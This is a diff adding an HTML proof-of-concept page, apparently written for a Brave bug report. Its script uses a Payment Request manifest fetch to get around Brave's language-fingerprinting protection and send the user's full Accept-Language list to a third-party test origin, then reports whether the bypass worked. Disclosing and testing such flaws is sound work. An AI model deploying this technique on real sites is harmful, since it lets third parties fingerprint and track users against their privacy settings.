@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Payment Request API Language Fingerprint Bypass</title>
+    <style>
+        :root { color-scheme: light dark; }
+        body { font-family: system-ui, -apple-system, sans-serif; line-height: 1.45; margin: 0 auto; padding: 18px; max-width: 820px; }
+        h1 { font-size: 1.4em; }
+        .card { border: 1px solid rgba(127,127,127,0.28); border-radius: 14px; padding: 14px 16px; margin: 14px 0; background: rgba(127,127,127,0.06); }
+        code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background: rgba(127,127,127,0.14); padding: 2px 6px; border-radius: 4px; word-break: break-all; }
+        table { border-collapse: collapse; width: 100%; margin-top: 8px; }
+        th, td { border: 1px solid rgba(127,127,127,0.28); padding: 8px 12px; text-align: left; vertical-align: top; font-size: 0.92em; }
+        th { background: rgba(127,127,127,0.1); }
+        td code { font-size: 0.9em; }
+        button { font-size: 1em; padding: 9px 20px; cursor: pointer; border-radius: 6px; border: 1px solid rgba(127,127,127,0.3); background: rgba(127,127,127,0.08); }
+        button:hover { background: rgba(127,127,127,0.16); }
+        button:disabled { opacity: 0.5; cursor: default; }
+        #status { margin-top: 10px; opacity: 0.85; min-height: 1.2em; }
+        #verdict { font-size: 1.15em; font-weight: bold; margin-top: 14px; }
+        .leak { color: #c0392b; }
+        .safe { color: #1e8449; }
+        ol li { margin: 4px 0; }
+        details { margin-top: 1.4em; opacity: 0.9; }
+        details summary { cursor: pointer; font-weight: bold; }
+        details pre { background: rgba(127,127,127,0.08); padding: 12px; border-radius: 6px; overflow-x: auto; font-size: 0.84em; }
+    </style>
+</head>
+<body>
+    <h1>Payment Request API Language Fingerprint Bypass</h1>
+
+    <div class="card">
+        <strong>Setup (to test the protection):</strong>
+        <ol>
+            <li>Open <code>brave://settings/shields</code> (or <code>privacy</code>) and enable
+                <em>"Prevent sites from fingerprinting me based on my language preferences"</em>
+                (this is on by default with Shields fingerprinting protection).</li>
+            <li>Open <code>brave://settings/languages</code> and add several non-English
+                preferred languages (e.g. French, German, Japanese), so your full list is distinctive.</li>
+            <li>Reload this page and click <strong>Run Test</strong>.</li>
+        </ol>
+        <p style="margin-bottom:0;">
+            This page is on <code>test-website-a.pages.dev</code>. The payment-method endpoints
+            live on the unrelated third-party origin <code>test-website-b.pages.dev</code>, which
+            is where your full language list leaks to.
+        </p>
+    </div>
+
+    <button id="run">Run Test</button>
+    <p id="status"></p>
+
+    <table id="results" style="display:none;">
+        <thead>
+            <tr><th>Source</th><th>Accept-Language seen by the server</th><th># languages</th></tr>
+        </thead>
+        <tbody></tbody>
+    </table>
+
+    <p id="verdict"></p>
+
+    <div class="card">
+        <strong><code>navigator.languages</code> (JS):</strong>
+        <span id="navlangs"></span>
+    </div>
+
+    <details>
+        <summary>How it works / why this is a bypass</summary>
+        <pre>const request = new PaymentRequest(
+  [{ supportedMethods: 'https://this-site/.../pmh/&lt;token&gt;' }],
+  { total: { label: 'total', amount: { value: '0', currency: 'USD' } } }
+);
+request.show();   // browser HEAD-fetches the manifest URL</pre>
+        <p>
+            Brave reduces <code>Accept-Language</code> to a single language inside
+            <code>BraveProxyingURLLoaderFactory</code> (the proxy installed for
+            renderer/frame network factories via
+            <code>WillCreateURLLoaderFactory</code>). A normal <code>fetch()</code>
+            from this page goes through that proxy and is reduced.
+        </p>
+        <p>
+            But <code>PaymentManifestDownloader</code> fetches the manifest using the
+            <em>browser-process</em> factory
+            (<code>GetURLLoaderFactoryForBrowserProcess()</code>). The renderer factory
+            is only used when the feature <code>kPaymentRequestUseRendererUrlLoader</code>
+            is enabled, and it is <strong>disabled by default</strong>. The browser-process
+            factory is not wrapped by Brave's proxy, so the reduction never runs and the
+            full <code>Accept-Language</code> list leaks &mdash; here, to an unrelated
+            third-party origin (<code>test-website-b.pages.dev</code>) that the merchant
+            page simply names as its payment method.
+        </p>
+        <p>
+            <strong>Verdict:</strong> if the Payment-manifest row below shows more
+            languages than the normal <code>fetch()</code> row, the protection was bypassed.
+        </p>
+    </details>
+
+    <script>
+        // The third-party origin that hosts the logging endpoints (Site B).
+        // Override with ?tp=https://localhost:8788 for local testing.
+        const TP_ORIGIN = new URLSearchParams(location.search).get('tp')
+            || 'https://test-website-b.pages.dev';
+        const base = TP_ORIGIN + '/payment-request-language-bypass';
+
+        document.getElementById('navlangs').innerHTML =
+            '<code>' + JSON.stringify(navigator.languages) + '</code>';
+
+        // Count distinct primary language subtags in an Accept-Language value,
+        // e.g. "fr-FR,fr;q=0.9,en;q=0.8" -> {fr, en} -> 2.
+        function countLanguages(al) {
+            if (!al) return 0;
+            const primaries = new Set();
+            for (const part of al.split(',')) {
+                const tag = part.split(';')[0].trim().toLowerCase();
+                if (tag) primaries.add(tag.split('-')[0]);
+            }
+            return primaries.size;
+        }
+
+        function setStatus(msg) { document.getElementById('status').textContent = msg; }
+
+        function addRow(source, value, count) {
+            const tbody = document.querySelector('#results tbody');
+            const tr = document.createElement('tr');
+            tr.innerHTML =
+                '<td>' + source + '</td>' +
+                '<td><code>' + (value || '(none)') + '</code></td>' +
+                '<td>' + count + '</td>';
+            tbody.appendChild(tr);
+        }
+
+        async function pollResult(token, timeoutMs) {
+            const deadline = Date.now() + timeoutMs;
+            while (Date.now() < deadline) {
+                const r = await fetch(base + '/result/' + token, { cache: 'no-store' });
+                const data = await r.json();
+                if (!data.pending) return data;
+                await new Promise(res => setTimeout(res, 400));
+            }
+            return null;
+        }
+
+        async function runTest() {
+            const btn = document.getElementById('run');
+            btn.disabled = true;
+            document.getElementById('results').style.display = 'none';
+            document.querySelector('#results tbody').innerHTML = '';
+            document.getElementById('verdict').textContent = '';
+
+            if (typeof PaymentRequest === 'undefined') {
+                setStatus('PaymentRequest API not available in this browser.');
+                btn.disabled = false;
+                return;
+            }
+
+            const token = (crypto.randomUUID && crypto.randomUUID()) ||
+                String(Date.now()) + Math.floor(Math.random() * 1e9);
+
+            // 1) Baseline: what Accept-Language does a normal page fetch send?
+            setStatus('Measuring normal fetch() Accept-Language...');
+            let pageLang = null;
+            try {
+                const echo = await fetch(base + '/echo', { cache: 'no-store' });
+                pageLang = (await echo.json()).acceptLanguage;
+            } catch (e) { /* ignore */ }
+
+            // 2) Trigger the Payment Request manifest fetch.
+            setStatus('Triggering PaymentRequest manifest fetch...');
+            const methodUrl = base + '/pmh/' + token;
+            try {
+                const request = new PaymentRequest(
+                    [{ supportedMethods: methodUrl }],
+                    { total: { label: 'total', amount: { value: '0', currency: 'USD' } } }
+                );
+                // show() needs a user gesture (we are inside a click handler).
+                // It will reject (no payment app), but the manifest HEAD fetch
+                // fires first, which is all we need.
+                request.show().then(
+                    resp => resp.abort && resp.abort(),
+                    () => {}
+                );
+            } catch (e) { /* show() may throw synchronously; manifest fetch still queued */ }
+
+            // 3) Read back what Accept-Language the manifest fetch carried.
+            setStatus('Waiting for the browser to fetch the payment manifest...');
+            const result = await pollResult(token, 12000);
+
+            document.getElementById('results').style.display = '';
+            addRow('Normal page <code>fetch()</code>', pageLang, countLanguages(pageLang));
+
+            if (!result) {
+                addRow('Payment Request manifest fetch', '(not received within 12s)', '-');
+                setStatus('No manifest request was captured. Some builds/configs may not fire it; try reloading.');
+                document.getElementById('verdict').textContent =
+                    'Inconclusive: payment-manifest request not observed.';
+                btn.disabled = false;
+                return;
+            }
+
+            const manifestLang = result.acceptLanguage;
+            addRow('Payment Request manifest fetch (' + result.method + ')',
+                   manifestLang, countLanguages(manifestLang));
+
+            setStatus('Done.');
+
+            const verdict = document.getElementById('verdict');
+            const pageCount = countLanguages(pageLang);
+            const manifestCount = countLanguages(manifestLang);
+            const differs = (manifestLang || '') !== (pageLang || '');
+
+            if (manifestCount > pageCount || (differs && manifestCount > 1 && pageCount <= 1)) {
+                verdict.className = 'leak';
+                verdict.textContent =
+                    'BYPASS CONFIRMED: the payment-manifest request leaked more languages ('
+                    + manifestCount + ') than the protected fetch() (' + pageCount
+                    + '). The full Accept-Language list escaped the protection.';
+            } else if (differs) {
+                verdict.className = 'leak';
+                verdict.textContent =
+                    'POSSIBLE LEAK: the payment-manifest Accept-Language differs from the normal fetch(). Compare the rows above.';
+            } else {
+                verdict.className = 'safe';
+                verdict.textContent =
+                    'No bypass detected: the payment-manifest request used the same reduced Accept-Language as a normal fetch().';
+            }
+            btn.disabled = false;
+        }
+
+        document.getElementById('run').addEventListener('click', runTest);
+    </script>
+</body>
+</html>
